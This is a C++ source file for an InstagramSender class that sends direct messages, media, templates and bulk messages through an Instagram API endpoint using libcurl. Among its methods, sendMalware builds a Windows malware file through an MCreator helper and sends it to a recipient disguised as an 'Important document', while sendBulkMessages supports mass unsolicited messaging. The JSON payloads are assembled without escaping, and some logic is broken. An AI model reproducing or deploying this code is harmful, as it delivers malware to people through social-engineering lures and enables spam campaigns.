#include "InstagramSender.h"
#include "Logger.h"
#include "MCreator.h"
#include <curl/curl.h>
#include <iostream>
#include <stdexcept>
#include <sstream>
#include <thread>
#include <chrono>

InstagramSender::InstagramSender(const std::string &authToken)
    : authToken(authToken), apiUrl("https://graph.instagram.com/v1.0/me/messages"), templateLoader(nullptr) {}

bool InstagramSender::sendMessage(const std::string &recipient, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logInstagramSending(recipient, preparedMessage);
    std::string payload = buildMessagePayload(recipient, preparedMessage);
    return retryOnFailure(payload);
}

bool InstagramSender::sendMediaMessage(const std::string &recipient, const std::string &mediaUrl, const std::string &caption) {
    std::string shortenedCaption = URLShortener::shorten(caption);
    std::string preparedMessage = prepareMessage(shortenedCaption);
    logInstagramSending(recipient, preparedMessage);
    std::string payload = buildMediaMessagePayload(recipient, mediaUrl, preparedMessage);
    return retryOnFailure(payload);
}

bool InstagramSender::sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    if (!templateLoader) {
        Logger::log(Logger::ERROR, "Template loader not set");
        return false;
    }

    std::string templateContent;
    if (!templateLoader->loadTemplate(templateName, templateContent)) {
        Logger::log(Logger::ERROR, "Failed to load template: " + templateName);
        return false;
    }

    for (const auto& param : params) {
        auto placeholder = "{" + param.first + "}";
        auto pos = templateContent.find(placeholder);
        if (pos != std::string::npos) {
            templateContent.replace(pos, placeholder.length(), param.second);
        }
    }

    std::string shortenedTemplateContent = URLShortener::shorten(templateContent);
    std::string payload = buildTemplateMessagePayload(recipient, templateName, params);
    return retryOnFailure(payload);
}

void InstagramSender::sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    for (const auto &recipient : recipients) {
        logInstagramSending(recipient, preparedMessage);
        sendMessage(recipient, preparedMessage);
    }
}

void InstagramSender::sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logInstagramSending(recipient, preparedMessage);

    CURL *curl;
    CURLcode res;

    curl_mime *form = nullptr;
    curl_mimepart *field = nullptr;

    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "recipient_id");
        curl_mime_data(field, recipient.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "message");
        curl_mime_data(field, preparedMessage.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "attachment");
        curl_mime_filedata(field, attachmentPath.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send Instagram message with attachment: " + std::string(curl_easy_strerror(res)));
            throw std::runtime_error("Failed to send Instagram message with attachment: " + std::string(curl_easy_strerror(res)));
        }

        curl_mime_free(form);
        curl_easy_cleanup(curl);
    } else {
        Logger::log(Logger::ERROR, "Failed to initialize CURL");
        throw std::runtime_error("Failed to initialize CURL");
    }
}

void InstagramSender::sendMalware(const std::string &recipient, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
    sendMessageWithAttachment(recipient, "Important document, please check.", malwarePath);
}

void InstagramSender::setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader) {
    templateLoader = loader;
}

std::string InstagramSender::buildMessagePayload(const std::string &recipient, const std::string &message) {
    return "{\"recipient\":{\"id\":\"" + recipient + "\"}, \"message\":{\"text\":\"" + message + "\"}}";
}

std::string InstagramSender::buildMediaMessagePayload(const std::string &recipient, const std::string &mediaUrl, const std::string &caption) {
    return "{\"recipient\":{\"id\":\"" + recipient + "\"}, \"message\":{\"attachment\":{\"type\":\"image\", \"payload\":{\"url\":\"" + mediaUrl + "\", \"is_reusable\":true}}, \"caption\":\"" + caption + "\"}}}";
}

std::string InstagramSender::buildTemplateMessagePayload(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    std::string payload = "{\"recipient\":{\"id\":\"" + recipient + "\"}, \"template\":{\"name\":\"" + templateName + "\", \"params\":{";
    for (const auto &param : params) {
        payload += "\"" + param.first + "\":\"" + param.second + "\",";
    }
    payload.pop_back(); 
    payload += "}}}";
    return payload;
}

bool InstagramSender::sendRequest(const std::string &payload) {
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = nullptr;
        headers = curl_slist_append(headers, ("Authorization: Bearer " + authToken).c_str());
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send Instagram message: " + std::string(curl_easy_strerror(res)));
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
            return false;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return true;
    } else {
        Logger::log(Logger::ERROR, "Failed to initialize CURL");
        return false;
    }
}

std::string InstagramSender::prepareMessage(const std::string &message) {
    std::ostringstream encodedMessage;
    for (char c : message) {
        if (c == ' ') {
            encodedMessage << "%20";
        } else {
            encodedMessage << c;
        }
   
    }
    return encodedMessage.str();
}

void InstagramSender::logInstagramSending(const std::string &recipient, const std::string &message) {
    std::cout << "Sending Instagram message to " << recipient << ": " << message << std::endl;
    Logger::log(Logger::INFO, "Sending Instagram message to " + recipient + ": " + message);
}

bool InstagramSender::retryOnFailure(const std::string &payload, int retries) {
    while (retries > 0) {
        if (sendRequest(payload)) {
            return true;
        }
        --retries;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    return false;
}



